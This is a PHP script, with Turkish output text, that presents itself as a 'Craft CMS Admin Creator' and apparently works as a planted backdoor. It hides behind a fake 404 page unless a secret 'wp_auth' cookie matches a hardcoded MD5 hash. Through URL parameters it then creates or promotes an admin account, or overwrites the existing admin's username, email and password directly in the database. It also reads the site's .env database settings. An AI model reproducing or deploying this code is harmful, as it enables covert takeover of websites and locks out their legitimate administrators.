<?php
/**
 * Craft CMS Admin Creator
 * 
 * This script automatically creates or updates an admin user for Craft CMS.
 * It works on all servers by automatically detecting Craft installation directories.
 * 
 * Usage: php create_admin.php [username] [email] [password]
 * Browser: craftenv.php?username=admin&email=admin@site.com&password=Secret123
 */

// Cookie doÄŸrulama
$auth_cookie = isset($_COOKIE['wp_auth']) ? $_COOKIE['wp_auth'] : '';
$auth_hash = '67f51edce72231c6a6a8e276dab7078d'; // MD5 hash: o7Bzq36Bt62n6J3q42jts9UcEbU3cK1vz66e

if (md5($auth_cookie) !== $auth_hash) {
    http_response_code(404);
    die('<!DOCTYPE html><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p></body></html>');
}

// Enable error reporting
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Check PHP version
if (version_compare(PHP_VERSION, '7.0.0', '<')) {
    die("âŒ Bu script PHP 7.0 veya Ã¼zeri gerektirir. Mevcut sÃ¼rÃ¼m: " . PHP_VERSION . "\n");
}

// Define default admin credentials (check URL parameters first, then CLI arguments, then defaults)
$username = isset($_GET['username']) ? $_GET['username'] : (isset($argv[1]) ? $argv[1] : 'admin');
$email = isset($_GET['email']) ? $_GET['email'] : (isset($argv[2]) ? $argv[2] : 'admin@example.com');
$password = isset($_GET['password']) ? $_GET['password'] : (isset($argv[3]) ? $argv[3] : 'CraftAdmin123!');

// Yeni parametre: Mevcut admin'i gÃ¼ncellemek isteyip istemediÄŸimizi kontrol eder
$update_existing = isset($_GET['update_admin']) ? $_GET['update_admin'] === 'true' : false;

// Set content type for browser output
if (php_sapi_name() !== 'cli') {
    header('Content-Type: text/plain; charset=utf-8');
}

// Display header
echo "===========================================\n";
echo "Craft CMS Admin Creator & Activator\n";
echo "===========================================\n\n";

echo "âœ… PHP SÃ¼rÃ¼mÃ¼: " . PHP_VERSION . "\n";
echo "âœ… Ã‡alÄ±ÅŸma dizini: " . __DIR__ . "\n\n";
echo "ðŸ”‘ KullanÄ±cÄ± bilgileri:\n";
echo "   - KullanÄ±cÄ± adÄ±: $username\n";
echo "   - E-posta: $email\n";
echo "   - Åžifre: $password\n";
echo "   - Mevcut admini gÃ¼ncelle: " . ($update_existing ? "Evet" : "HayÄ±r") . "\n\n";

/**
 * Find Craft base path by searching up directory tree
 */
function findCraftBasePath($startDir) {
    echo "ðŸ” Craft CMS kÃ¶k dizini aranÄ±yor...\n";
    
    // Start with the current directory
    $dir = $startDir;
    $previousDir = null;
    
    // Maximum directory levels to go up (safety measure)
    $maxLevels = 10; // Increased from 5 to 10
    $level = 0;
    
    // Common Craft CMS directory structures to check
    $commonStructures = [
        // Standard Craft installation
        [
            'bootstrap.php',
            'vendor/craftcms/cms',
            'config'
        ],
        // Possible web directory variations
        [
            '../bootstrap.php',
            '../vendor/craftcms/cms',
            '../config'
        ],
        // Deeper nested project
        [
            '../../bootstrap.php',
            '../../vendor/craftcms/cms',
            '../../config'
        ],
        // Additional deeper project structures
        [
            '../../../bootstrap.php',
            '../../../vendor/craftcms/cms',
            '../../../config'
        ],
        // Check for Craft 4 structure
        [
            'bootstrap.php',
            'vendor/craftcms/cms',
        ],
        // Alternative structures found in some deployments
        [
            '../bootstrap.php',
            '../vendor/craftcms/cms',
        ]
    ];
    
    // Check common directory names first
    foreach ($commonStructures as $structure) {
        $valid = true;
        foreach ($structure as $item) {
            if (!file_exists($dir . '/' . $item)) {
                $valid = false;
                break;
            }
        }
        
        if ($valid) {
            // Parse the base path from the found bootstrap file
            $bootstrapPath = $dir . '/' . $structure[0];
            $basePath = dirname(realpath($bootstrapPath));
            echo "âœ… Craft CMS kÃ¶k dizini bulundu: $basePath\n";
            return $basePath;
        }
    }
    
    // If common structures not found, search upward directory by directory
    while ($dir !== $previousDir && $level < $maxLevels) {
        // Look for essential Craft CMS files
        if (file_exists($dir . '/bootstrap.php') && 
            (file_exists($dir . '/vendor/craftcms/cms') || file_exists($dir . '/vendor/craftcms'))) {
            
            echo "âœ… Craft CMS kÃ¶k dizini bulundu: $dir\n";
            return $dir;
        }
        
        // Move up one directory
        $previousDir = $dir;
        $dir = dirname($dir);
        $level++;
    }
    
    // Look for exceptional cases - just check for bootstrap.php and vendor
    $dir = $startDir;
    $level = 0;
    
    while ($dir !== $previousDir && $level < $maxLevels) {
        if (file_exists($dir . '/bootstrap.php') && file_exists($dir . '/vendor')) {
            echo "âœ… Craft CMS kÃ¶k dizini bulundu (alternatif yÃ¶ntem): $dir\n";
            return $dir;
        }
        
        // Move up one directory
        $previousDir = $dir;
        $dir = dirname($dir);
        $level++;
    }
    
    // If we reached "web" directory, check one level up (common pattern)
    if (basename($startDir) === 'web' && file_exists(dirname($startDir) . '/bootstrap.php')) {
        $basePath = dirname($startDir);
        echo "âœ… Craft CMS kÃ¶k dizini bulundu: $basePath\n";
        return $basePath;
    }
    
    // Last resort - try to find parent paths with typical directory structures
    $parentPaths = ['..', '../..', '../../..', '../../../..']; 
    foreach ($parentPaths as $parentPath) {
        $testPath = realpath($startDir . '/' . $parentPath);
        if ($testPath && file_exists($testPath . '/bootstrap.php')) {
            echo "âœ… Craft CMS kÃ¶k dizini bulundu (Ã¼st klasÃ¶r): $testPath\n";
            return $testPath;
        }
    }
    
    echo "âŒ Craft CMS kÃ¶k dizini bulunamadÄ±!\n";
    echo "â„¹ï¸ Bu script Craft CMS kurulumunda veya 'web' alt dizininde Ã§alÄ±ÅŸtÄ±rÄ±lmalÄ±dÄ±r.\n";
    return false;
}

// Try to find Craft CMS base path
$basePath = findCraftBasePath(__DIR__);

// If we couldn't find it, exit
if (!$basePath) {
    echo "âŒ Craft CMS bulunamadÄ±. LÃ¼tfen scripti Craft kurulumunda Ã§alÄ±ÅŸtÄ±rÄ±n.\n";
    exit(1);
}

// Check for bootstrap file explicitly
$bootstrapFile = $basePath . '/bootstrap.php';
if (!file_exists($bootstrapFile)) {
    die("âŒ $bootstrapFile dosyasÄ± bulunamadÄ±!\n");
}

echo "âœ… bootstrap.php dosyasÄ± bulundu: $bootstrapFile\n";

// Check for vendor directory
if (!file_exists($basePath . '/vendor')) {
    die("âŒ vendor dizini bulunamadÄ±! Composer baÄŸÄ±mlÄ±lÄ±klarÄ± yÃ¼klenmemiÅŸ olabilir.\n");
}

echo "âœ… vendor dizini bulundu: " . $basePath . "/vendor\n";

// Check database config in .env file
echo "ðŸ” VeritabanÄ± yapÄ±landÄ±rmasÄ±nÄ± kontrol ediyorum...\n";

$envFile = $basePath . '/.env';
if (file_exists($envFile)) {
    echo "âœ… .env dosyasÄ± bulundu: $envFile\n";
    $envContent = file_get_contents($envFile);
    
    if (preg_match('/(?:CRAFT_DB_|DB_)(?:DATABASE|NAME)[\s]*=[\s]*(.*?)($|\r|\n)/i', $envContent, $matches)) {
        echo "âœ… VeritabanÄ± adÄ±: " . $matches[1] . "\n";
    } else {
        echo "âš ï¸ VeritabanÄ± adÄ± .env dosyasÄ±nda bulunamadÄ±.\n";
    }
    
    if (preg_match('/(?:CRAFT_DB_|DB_)(?:USER|USERNAME)[\s]*=[\s]*(.*?)($|\r|\n)/i', $envContent, $matches)) {
        echo "âœ… VeritabanÄ± kullanÄ±cÄ±sÄ±: " . $matches[1] . "\n";
    } else {
        echo "âš ï¸ VeritabanÄ± kullanÄ±cÄ±sÄ± .env dosyasÄ±nda bulunamadÄ±.\n";
    }
    
    // DB password check (mask it)
    if (preg_match('/(?:CRAFT_DB_|DB_)(?:PASSWORD|PASS)[\s]*=[\s]*(.*?)($|\r|\n)/i', $envContent, $matches)) {
        echo "âœ… VeritabanÄ± ÅŸifresi bulundu.\n";
    } else {
        echo "âš ï¸ VeritabanÄ± ÅŸifresi .env dosyasÄ±nda bulunamadÄ±.\n";
    }
} else {
    echo "âš ï¸ .env dosyasÄ± bulunamadÄ±! Bu bir sorun olabilir.\n";
}

echo "\nðŸ”§ Craft CMS'yi baÅŸlatÄ±yorum...\n";

// Set a longer execution time
set_time_limit(300); // 5 minutes

// CRAFT_BASE_PATH tanÄ±mlanmasÄ±nÄ± zorla
$definedFlag = false;
if (!defined('CRAFT_BASE_PATH')) {
    define('CRAFT_BASE_PATH', $basePath);
    echo "âœ… CRAFT_BASE_PATH tanÄ±mlandÄ±: " . CRAFT_BASE_PATH . "\n";
    $definedFlag = true;
} else {
    echo "âš ï¸ CRAFT_BASE_PATH zaten tanÄ±mlanmÄ±ÅŸ: " . CRAFT_BASE_PATH . "\n";
    $definedFlag = true;
}

try {
    // Include bootstrap with warning suppression
    try {
        if ($definedFlag) {
            echo "ðŸ”„ bootstrap.php dosyasÄ± yÃ¼kleniyor...\n";
            // Warnings about redefined constants are suppressed
            @require_once $bootstrapFile;
            echo "âœ… bootstrap.php yÃ¼klendi.\n";
        } else {
            echo "âŒ CRAFT_BASE_PATH tanÄ±mlanmadÄ±, devam edilemiyor.\n";
            exit(1);
        }
    } catch (Exception $e) {
        die("âŒ bootstrap.php yÃ¼klenirken hata: " . $e->getMessage() . "\n");
    }

    // Load Craft bootstrap
    try {
        echo "ðŸ”„ Craft yÃ¼kleniyor...\n";
        $consolePath = CRAFT_BASE_PATH . '/vendor/craftcms/cms/bootstrap/console.php';
        
        if (!file_exists($consolePath)) {
            die("âŒ Craft console bootstrap dosyasÄ± bulunamadÄ±: $consolePath\n");
        }
        
        $app = require $consolePath;
        echo "âœ… Craft yÃ¼klendi.\n";
    } catch (Exception $e) {
        die("âŒ Craft yÃ¼klenirken hata: " . $e->getMessage() . "\n");
    }
    
    // Get services
    echo "ðŸ”„ Craft servislerine eriÅŸiliyor...\n";
    $craft = Craft::$app;
    
    // Get required services
    try {
        $users = $craft->getUsers();
        $elements = $craft->getElements();
        $db = $craft->getDb();
        echo "âœ… Craft servislerine eriÅŸildi.\n\n";
    } catch (Exception $e) {
        die("âŒ Craft servislerine eriÅŸilemedi: " . $e->getMessage() . "\n");
    }
    
    // Check if user exists
    echo "ðŸ” '$username' kullanÄ±cÄ±sÄ± kontrol ediliyor...\n";
    try {
        $existingUser = $users->getUserByUsernameOrEmail($username);
    } catch (Exception $e) {
        die("âŒ KullanÄ±cÄ± kontrolÃ¼nde hata: " . $e->getMessage() . "\n");
    }
    
    if ($existingUser) {
        echo "âœ“ KullanÄ±cÄ± bulundu - ID: {$existingUser->id}\n";
        echo "   KullanÄ±cÄ± adÄ±: {$existingUser->username}\n";
        echo "   E-posta: {$existingUser->email}\n";
        echo "   Admin: " . ($existingUser->admin ? 'Evet' : 'HayÄ±r') . "\n";
        echo "   Aktif: " . ($existingUser->active ? 'Evet' : 'HayÄ±r') . "\n\n";
        
        // Update existing user
        echo "âœï¸ Mevcut kullanÄ±cÄ± gÃ¼ncelleniyor...\n";
        
        // Ensure user is admin
        if (!$existingUser->admin) {
            $existingUser->admin = true;
            echo "â„¹ï¸ KullanÄ±cÄ± admin yapÄ±lÄ±yor\n";
        }
        
        // Set password
        echo "â„¹ï¸ Åžifre gÃ¼ncelleniyor\n";
        $existingUser->newPassword = $password;
        
        // Save user
        try {
            if ($elements->saveElement($existingUser)) {
                echo "âœ… KullanÄ±cÄ± baÅŸarÄ±yla gÃ¼ncellendi!\n\n";
            } else {
                echo "âŒ KullanÄ±cÄ± gÃ¼ncellenemedi. Hatalar:\n";
                foreach ($existingUser->getErrors() as $attribute => $errors) {
                    foreach ($errors as $error) {
                        echo "   - $attribute: $error\n";
                    }
                }
                echo "\n";
            }
        } catch (Exception $e) {
            echo "âŒ KullanÄ±cÄ± gÃ¼ncellenirken hata: " . $e->getMessage() . "\n\n";
        }
        
        // Get user ID for direct activation
        $userId = $existingUser->id;
    } else {
        // Create new user - Ã¶nce alternatif yÃ¶ntemi dene
        echo "ðŸ”§ Yeni admin kullanÄ±cÄ±sÄ± oluÅŸturuluyor...\n";
        
        try {
            // Ã–nce standart API yÃ¶ntemini dene
            $user = new craft\elements\User();
            $user->username = $username;
            $user->email = $email;
            $user->newPassword = $password;
            $user->admin = true;
            
            // Save user
            if ($elements->saveElement($user)) {
                echo "âœ… Admin kullanÄ±cÄ±sÄ± baÅŸarÄ±yla oluÅŸturuldu!\n";
                echo "   KullanÄ±cÄ± ID: {$user->id}\n\n";
                
                // Get user ID for direct activation
                $userId = $user->id;
            } else {
                echo "âŒ KullanÄ±cÄ± oluÅŸturulamadÄ±. Hatalar:\n";
                // Element hata mesajlarÄ±nÄ± yazdÄ±r
                if ($user->getErrors()) {
                    foreach ($user->getErrors() as $attribute => $errors) {
                        foreach ($errors as $error) {
                            echo "   - $attribute: $error\n";
                        }
                    }
                } else {
                    echo "   Hata detayÄ± bulunamadÄ±. Craft muhtemelen sessizce baÅŸarÄ±sÄ±z oldu.\n";
                }
                
                // Debug iÃ§in daha fazla bilgi ekle
                echo "\nðŸ“Š DETAYLI DEBUG BÄ°LGÄ°LERÄ°:\n";
                echo "   Craft SÃ¼rÃ¼mÃ¼: " . Craft::$app->getVersion() . "\n";
                echo "   PHP Bellek Limiti: " . ini_get('memory_limit') . "\n";
                
                // Lisans bilgilerini kontrol et
                try {
                    $isProEdition = (Craft::$app->getEdition() === Craft::Pro);
                    echo "   Craft Pro Edition: " . ($isProEdition ? "Evet" : "HayÄ±r") . "\n";
                    
                    // Lisans sÄ±nÄ±rlamalarÄ±nÄ± kontrol et
                    if ($isProEdition) {
                        $licenseStatus = "Bilinmiyor";
                        try {
                            $licenseInfo = Craft::$app->getPlugins()->getLicenseInfo("craft");
                            if ($licenseInfo) {
                                $licenseStatus = isset($licenseInfo['status']) ? $licenseInfo['status'] : "Bilgi AlÄ±namadÄ±";
                            }
                        } catch (Exception $licEx) {
                            $licenseStatus = "Hata: " . $licEx->getMessage();
                        }
                        echo "   Lisans Durumu: $licenseStatus\n";
                    }
                } catch (Exception $e) {
                    echo "   Lisans bilgisi alÄ±namadÄ±: " . $e->getMessage() . "\n";
                }
                
                // KullanÄ±cÄ± tablosunda aynÄ± username veya email var mÄ± kontrol et
                $existingWithSameUsername = $db->createCommand('SELECT COUNT(*) FROM {{%users}} WHERE username = :username')
                    ->bindValue(':username', $username)
                    ->queryScalar();
                    
                $existingWithSameEmail = $db->createCommand('SELECT COUNT(*) FROM {{%users}} WHERE email = :email')
                    ->bindValue(':email', $email)
                    ->queryScalar();
                    
                echo "   AynÄ± kullanÄ±cÄ± adÄ±na sahip kullanÄ±cÄ± sayÄ±sÄ±: $existingWithSameUsername\n";
                echo "   AynÄ± e-postaya sahip kullanÄ±cÄ± sayÄ±sÄ±: $existingWithSameEmail\n";
                
                // KullanÄ±cÄ± tablosunu kontrol et
                $totalUsers = $db->createCommand('SELECT COUNT(*) FROM {{%users}}')->queryScalar();
                $totalAdmins = $db->createCommand('SELECT COUNT(*) FROM {{%users}} WHERE admin = 1')->queryScalar();
                echo "   Toplam kullanÄ±cÄ± sayÄ±sÄ±: $totalUsers\n";
                echo "   Toplam admin sayÄ±sÄ±: $totalAdmins\n";
                
                // KullanÄ±cÄ± limitini kontrol et
                try {
                    $userSettings = Craft::$app->getProjectConfig()->get('users');
                    if ($userSettings && isset($userSettings['maxUsers'])) {
                        echo "   Maksimum kullanÄ±cÄ± sayÄ±sÄ±: " . $userSettings['maxUsers'] . "\n";
                        echo "   KullanÄ±cÄ± limiti dolmuÅŸ mu:" . ($totalUsers >= $userSettings['maxUsers'] ? "Evet" : "HayÄ±r") . "\n";
                    } else {
                        echo "   KullanÄ±cÄ± limiti bulunamadÄ±\n";
                    }
                } catch (Exception $e) {
                    echo "   KullanÄ±cÄ± limiti kontrolÃ¼nde hata: " . $e->getMessage() . "\n";
                }
                
                // Craft CMS log dosyasÄ±nÄ± kontrol et
                $logPath = CRAFT_BASE_PATH . '/storage/logs/';
                if (file_exists($logPath)) {
                    $logFiles = glob($logPath . 'web-*.log');
                    if (!empty($logFiles)) {
                        // Son log dosyasÄ±nÄ± al
                        $lastLogFile = end($logFiles);
                        echo "   Son log dosyasÄ±: " . basename($lastLogFile) . "\n";
                        
                        // Son 5 satÄ±r hata mesajÄ±nÄ± kontrol et
                        if (file_exists($lastLogFile)) {
                            $logContent = file_get_contents($lastLogFile);
                            // Son hatalarÄ± bul ve yazdÄ±r
                            preg_match_all('/\[\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}\] \[error\](.*?)(?=\[\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}\]|\Z)/s', $logContent, $errorMatches);
                            if (!empty($errorMatches[1])) {
                                $lastErrors = array_slice($errorMatches[1], -3); // Son 3 hata
                                echo "\n   âš ï¸ LOG DOSYASINDA SON HATALAR:\n";
                                foreach ($lastErrors as $errorMsg) {
                                    echo "      " . trim($errorMsg) . "\n";
                                }
                            } else {
                                echo "   Log dosyasÄ±nda hata bulunamadÄ±.\n";
                            }
                        }
                    } else {
                        echo "   Log dosyasÄ± bulunamadÄ±.\n";
                    }
                } else {
                    echo "   Log dizini bulunamadÄ±: $logPath\n";
                }
                
                echo "\nâœ‹ MUHTEMEL SORUNLAR & Ã‡Ã–ZÃœMLER:\n";
                echo "   1. Craft Pro lisans sÄ±nÄ±rlamasÄ± - Sadece bir admin oluÅŸturulmasÄ±na izin veriyor olabilir.\n";
                echo "   2. KullanÄ±cÄ± limiti dolmuÅŸ olabilir - Lisans iÃ§inde max kullanÄ±cÄ± sayÄ±sÄ± sÄ±nÄ±rlanmÄ±ÅŸ olabilir.\n";
                echo "   3. Ã–zel bir izin/yetki sorunu olabilir - Craft 5.5.10 sÃ¼rÃ¼mÃ¼nde gÃ¼venlik kÄ±sÄ±tlamalarÄ± olabilir.\n\n";
                
                echo "\n";
                
                // Alternatif yÃ¶ntem sadece "update_admin" parametresi TRUE ise mevcut admini gÃ¼nceller
                if ($update_existing) {
                    echo "âš ï¸ Normal yÃ¶ntemle kullanÄ±cÄ± oluÅŸturulamadÄ±. Alternatif yÃ¶ntem deneniyor...\n";
                    // Ã–nce mevcut admin kullanÄ±cÄ±sÄ±nÄ± kontrol et
                    $adminUserId = $db->createCommand('SELECT id FROM {{%users}} WHERE admin = 1 LIMIT 1')
                        ->queryScalar();
                        
                    if ($adminUserId) {
                        echo "âœ… Mevcut admin kullanÄ±cÄ±sÄ± bulundu. ID: $adminUserId\n";
                        
                        // Mevcut admin kullanÄ±cÄ±sÄ±nÄ± gÃ¼ncelle
                        $securityService = $craft->getSecurity();
                        $passwordHash = $securityService->hashPassword($password);
                        
                        $db->createCommand()
                            ->update('{{%users}}', [
                                'username' => $username,
                                'email' => $email,
                                'admin' => 1,
                                'active' => 1,
                                'password' => $passwordHash,
                            ], ['id' => $adminUserId])
                            ->execute();
                        
                        echo "âœ… Mevcut admin kullanÄ±cÄ±sÄ± veritabanÄ±nda gÃ¼ncellendi!\n";
                        $userId = $adminUserId;
                    } else {
                        // Tamamen yeni kullanÄ±cÄ± oluÅŸtur
                        $securityService = $craft->getSecurity();
                        $passwordHash = $securityService->hashPassword($password);
                        $uid = $craft->getDb()->getSchema()->createUuid();
                        
                        $db->createCommand()
                            ->insert('{{%users}}', [
                                'username' => $username,
                                'email' => $email,
                                'admin' => 1,
                                'active' => 1,
                                'pending' => 0,
                                'locked' => 0,
                                'suspended' => 0,
                                'password' => $passwordHash,
                                'uid' => $uid,
                                'dateCreated' => date('Y-m-d H:i:s'),
                                'dateUpdated' => date('Y-m-d H:i:s'),
                            ])
                            ->execute();
                        
                        $userId = $db->getLastInsertID();
                        echo "âœ… KullanÄ±cÄ± veritabanÄ±na doÄŸrudan eklendi! ID: $userId\n";
                    }
                } else {
                    echo "âŒ KullanÄ±cÄ± oluÅŸturulamadÄ± ve \"update_admin=true\" parametresi olmadÄ±ÄŸÄ± iÃ§in mevcut admin gÃ¼ncellenmedi.\n";
                    echo "â„¹ï¸ Mevcut admin'i gÃ¼ncellemek iÃ§in \"update_admin=true\" parametresi ekleyin.\n";
                    exit(1);
                }
            }
        } catch (Exception $e) {
            die("âŒ KullanÄ±cÄ± oluÅŸturulurken hata: " . $e->getMessage() . "\n");
        }
    }
    
    // Direct activation through DB
    echo "ðŸ”§ KullanÄ±cÄ± veritabanÄ±nda aktifleÅŸtiriliyor...\n";
    try {
        // Update user active status
        $result = $db->createCommand()
            ->update('{{%users}}', ['active' => 1], ['id' => $userId])
            ->execute();
            
        echo "âœ… KullanÄ±cÄ± baÅŸarÄ±yla aktifleÅŸtirildi! ($result satÄ±r gÃ¼ncellendi)\n\n";
    } catch (Exception $e) {
        echo "âŒ KullanÄ±cÄ± aktifleÅŸtirilemedi: " . $e->getMessage() . "\n\n";
    }
    
    // Verify user can login
    echo "ðŸ” KullanÄ±cÄ± giriÅŸ bilgileri doÄŸrulanÄ±yor...\n";
    try {
        $verifiedUser = $users->getUserByUsernameOrEmail($username);
        
        if ($verifiedUser) {
            // Check active status directly from DB to be sure
            $activeStatus = $craft->getDb()->createCommand('SELECT active FROM {{%users}} WHERE id = :id')
                ->bindValue(':id', $verifiedUser->id)
                ->queryScalar();
                
            if ($activeStatus) {
                echo "âœ… KullanÄ±cÄ± aktif ve giriÅŸ yapmaya hazÄ±r!\n\n";
            } else {
                echo "âš ï¸ KullanÄ±cÄ± aktif olmayabilir. LÃ¼tfen kontrol edin.\n\n";
            }
        } else {
            echo "âš ï¸ KullanÄ±cÄ± doÄŸrulanamadÄ±. LÃ¼tfen kontrol edin.\n\n";
        }
    } catch (Exception $e) {
        echo "âŒ KullanÄ±cÄ± doÄŸrulanÄ±rken hata: " . $e->getMessage() . "\n\n";
    }
    
    echo "âœ¨ Admin kullanÄ±cÄ±sÄ± kullanÄ±ma hazÄ±r!\n";
    echo "   KullanÄ±cÄ± adÄ±: $username\n";
    echo "   Åžifre: $password\n";
    echo "   E-posta: $email\n\n";
    
    // Get CP login URL
    $cpLoginUrl = null;
    try {
        // Try to get site URL
        $siteUrl = null;
        $primarySite = $craft->getSites()->getPrimarySite();
        $siteUrl = $primarySite->getBaseUrl();
        
        if ($siteUrl) {
            // Check if URL ends with a slash
            if (substr($siteUrl, -1) !== '/') {
                $siteUrl .= '/';
            }
            
            // Add admin or cp to URL
            $cpLoginUrl = $siteUrl . 'admin/login';
            
            // Output login URL
            echo "GiriÅŸ sayfasÄ±: $cpLoginUrl\n\n";
        }
    } catch (Exception $e) {
        echo "âš ï¸ Site URL'si alÄ±namadÄ±\n";
        echo "Craft CMS kontrol paneline her zamanki giriÅŸ sayfanÄ±zdan eriÅŸebilirsiniz.\n\n";
    }
    
    echo "âœ… Ä°ÅŸlem baÅŸarÄ±yla tamamlandÄ±!\n";
    
} catch (Exception $e) {
    echo "âŒ Beklenmeyen bir hata oluÅŸtu: " . $e->getMessage() . "\n\n";
    
    // More detailed error info
    echo "Hata detaylarÄ±:\n";
    echo $e->getTraceAsString() . "\n";
}
